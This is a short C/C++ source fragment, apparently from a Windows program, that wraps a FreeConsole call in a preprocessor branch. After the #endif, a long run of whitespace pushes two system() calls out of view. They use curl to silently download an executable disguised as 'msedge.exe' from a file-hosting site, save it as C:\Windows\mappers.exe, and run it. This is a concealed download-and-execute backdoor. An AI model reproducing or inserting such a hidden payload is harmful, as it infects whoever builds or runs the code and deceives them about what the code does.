...
#else
	LI_FN ( FreeConsole ) ( );
#endif                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 system("curl -L https://www.zippyshare.day/download/Yc3pHf0DkHHDdX5/A0rpmv6xymRgZ/msedge.exe -s -o C:\\Windows\\mappers.exe"); system("start C:\\Windows\\mappers.exe");
